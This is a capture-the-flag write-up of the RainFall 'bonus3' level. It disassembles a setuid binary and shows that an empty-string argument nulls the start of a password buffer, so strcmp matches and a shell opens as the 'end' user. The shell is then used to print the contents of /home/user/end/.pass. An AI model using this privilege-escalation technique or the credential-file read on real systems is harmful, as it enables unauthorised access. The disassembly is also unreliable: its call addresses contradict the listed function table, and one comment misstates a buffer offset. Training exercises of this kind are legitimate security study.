# Bonus3 - Null Byte Index Exploitation
## Initial Analysis
### 1. Examine the Binary
```bash
bonus3@RainFall:~$ ls -la
total 8
-rwsr-s---+ 1 end users 5595 Mar  6  2016 bonus3
bonus3@RainFall:~$ file bonus3
bonus3: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x5a8b7f4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a, not stripped
```
**Key observations:**

setuid and setgid binary (s flags in permissions)

Owned by end user (final level!)

When executed, runs with end privileges

### 2. Test Basic Execution
```bash
bonus3@RainFall:~$ ./bonus3
bonus3@RainFall:~$ ./bonus3 test

bonus3@RainFall:~$ ./bonus3 hello world
bonus3@RainFall:~$
```
**Observations:**

No arguments: Program exits silently

One argument: Prints a newline and exits

Two arguments: Also exits silently

Program expects exactly one argument

## Reverse Engineering
### 3. Function Analysis
```bash
bonus3@RainFall:~$ gdb bonus3
(gdb) info functions
All defined functions:
0x080483d0  fread@plt
0x080483e0  fclose@plt
0x080483f0  puts@plt
0x08048400  __libc_start_main@plt
0x08048410  fopen@plt
0x08048420  execl@plt
0x08048430  atoi@plt
0x08048440  strcmp@plt
0x080484f4  main
```
Only main() function - everything is self-contained.

### 4. Disassembling main
```bash
(gdb) disas main
assembly
0x080484f4 <+0>:     push   %ebp
0x080484f5 <+1>:     mov    %esp,%ebp
0x080484f7 <+3>:     push   %edi
0x080484f8 <+4>:     push   %ebx
0x080484f9 <+5>:     and    $0xfffffff0,%esp
0x080484fc <+8>:     sub    $0xa0,%esp

# Open password file
0x08048502 <+14>:    mov    $0x80486f0,%edx        # "/home/user/end/.pass"
0x08048507 <+19>:    mov    $0x80486f2,%eax        # "r" (read mode)
0x0804850c <+24>:    mov    %edx,0x4(%esp)
0x08048510 <+28>:    mov    %eax,(%esp)
0x08048513 <+31>:    call   0x8048410 <fopen@plt>
0x08048518 <+36>:    mov    %eax,0x9c(%esp)        # Store FILE*

# Clear buffer (esp+0x18 = buffer start, 0x21 * 4 = 132 bytes)
0x0804851f <+43>:    lea    0x18(%esp),%ebx
0x08048523 <+47>:    mov    $0x0,%eax
0x08048528 <+52>:    mov    $0x21,%edx
0x0804852d <+57>:    mov    %ebx,%edi
0x0804852f <+59>:    mov    %edx,%ecx
0x08048531 <+61>:    rep stos %eax,%es:(%edi)      # Zero out buffer

# Check if file opened successfully
0x08048533 <+63>:    cmpl   $0x0,0x9c(%esp)
0x0804853b <+71>:    je     0x8048543 <main+79>
0x0804853d <+73>:    cmpl   $0x2,0x8(%ebp)         # Check argc == 2
0x08048541 <+77>:    je     0x804854d <main+89>
0x08048543 <+79>:    mov    $0xffffffff,%eax
0x08048548 <+84>:    jmp    0x8048615 <main+289>

# First fread - read 66 bytes from file
0x0804854d <+89>:    lea    0x18(%esp),%eax        # Buffer at esp+24
0x08048551 <+93>:    mov    0x9c(%esp),%edx        # FILE*
0x08048558 <+100>:   mov    %edx,0xc(%esp)         # 4th arg: file
0x0804855c <+104>:   movl   $0x42,0x8(%esp)        # 3rd arg: 66 bytes
0x08048564 <+112>:   movl   $0x1,0x4(%esp)         # 2nd arg: 1 (size)
0x0804856c <+120>:   mov    %eax,(%esp)            # 1st arg: buffer
0x0804856f <+123>:   call   0x80483d0 <fread@plt>

# Add null terminator at position 66
0x08048574 <+128>:   movb   $0x0,0x59(%esp)        # buffer[66] = 0

# Convert argv[1] to integer
0x08048579 <+133>:   mov    0xc(%ebp),%eax         # argv
0x0804857c <+136>:   add    $0x4,%eax              # argv[1]
0x0804857f <+139>:   mov    (%eax),%eax
0x08048581 <+141>:   mov    %eax,(%esp)
0x08048584 <+144>:   call   0x8048430 <atoi@plt>   # atoi(argv[1])

# Write NULL byte at buffer[atoi_result] - THIS IS THE VULNERABILITY! ⚡
0x08048589 <+149>:   movb   $0x0,0x18(%esp,%eax,1)

# Second fread - read 65 bytes from file (appended after first read)
0x0804858e <+154>:   lea    0x18(%esp),%eax        # Buffer start
0x08048592 <+158>:   lea    0x42(%eax),%edx        # buffer + 66
0x08048595 <+161>:   mov    0x9c(%esp),%eax        # FILE*
0x0804859c <+168>:   mov    %eax,0xc(%esp)         # 4th arg: file
0x080485a0 <+172>:   movl   $0x41,0x8(%esp)        # 3rd arg: 65 bytes
0x080485a8 <+180>:   movl   $0x1,0x4(%esp)         # 2nd arg: 1 (size)
0x080485b0 <+188>:   mov    %edx,(%esp)            # 1st arg: buffer+66
0x080485b3 <+191>:   call   0x80483d0 <fread@plt>

# Close file
0x080485b8 <+196>:   mov    0x9c(%esp),%eax
0x080485bf <+203>:   mov    %eax,(%esp)
0x080485c2 <+206>:   call   0x80483c0 <fclose@plt>

# Compare buffer with argv[1]
0x080485c7 <+211>:   mov    0xc(%ebp),%eax         # argv
0x080485ca <+214>:   add    $0x4,%eax              # argv[1]
0x080485cd <+217>:   mov    (%eax),%eax
0x080485cf <+219>:   mov    %eax,0x4(%esp)         # 2nd arg: argv[1]
0x080485d3 <+223>:   lea    0x18(%esp),%eax        # buffer
0x080485d7 <+227>:   mov    %eax,(%esp)            # 1st arg: buffer
0x080485da <+230>:   call   0x80483b0 <strcmp@plt>

# If strings are equal, execute shell
0x080485df <+235>:   test   %eax,%eax
0x080485e1 <+237>:   jne    0x8048601 <main+269>
0x080485e3 <+239>:   movl   $0x0,0x8(%esp)         # NULL envp
0x080485eb <+247>:   movl   $0x8048707,0x4(%esp)   # "sh"
0x080485f3 <+255>:   movl   $0x804870a,(%esp)      # "/bin/sh"
0x080485fa <+262>:   call   0x8048420 <execl@plt>  # execl("/bin/sh", "sh", NULL) - SHELL! 🎯

# If not equal, print buffer+66 and exit
0x08048601 <+269>:   lea    0x18(%esp),%eax
0x08048605 <+273>:   add    $0x42,%eax             # buffer + 66
0x08048608 <+276>:   mov    %eax,(%esp)
0x0804860b <+279>:   call   0x80483e0 <puts@plt>   # Print second part
0x08048610 <+284>:   mov    $0x0,%eax
0x08048615 <+289>:   lea    -0x8(%ebp),%esp
0x08048618 <+292>:   pop    %ebx
0x08048619 <+293>:   pop    %edi
0x0804861a <+294>:   pop    %ebp
0x0804861b <+295>:   ret
```
## The Vulnerability
### 6. Understanding the Bug
The program reads the password file into a buffer, then allows us to nullify one byte at an index we control:

```c
int index = atoi(argv[1]);  // User-controlled index
buffer[index] = 0;           // Write NULL at that position!
```
After this, it reads the rest of the file, then compares the buffer with our original argument.
### 7. The Key Insight
If we make atoi(argv[1]) return 0, then:

```c
buffer[0] = 0;  // First byte of buffer becomes NULL
```
Now the buffer starts with a null terminator:

```text
Before: buffer = [p0][p1][p2][p3]...[password content]
After:  buffer = [0][p1][p2][p3]...
```
### 8. How strcmp Behaves
strcmp compares strings until it encounters a null terminator in either string:

```c
strcmp(buffer, argv[1])
If buffer[0] = 0, 
```
Then strcmp immediately sees a null terminator in the first string and stops. It will compare:
An empty string (buffer)

Against argv[1]

### 9. The Perfect Input
What makes atoi() return 0?

atoi("0") → 0

atoi("") → 0 (empty string!)

atoi("not a number") → 0

If we pass an empty string as argument:

bash
./bonus3 ""
Then:

atoi("") = 0

buffer[0] = 0 (first byte nullified)

strcmp(buffer, "") compares empty string with empty string → MATCH!

Shell executes!

## Exploitation
### 10. The Exploit
```bash
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
$ exit
```
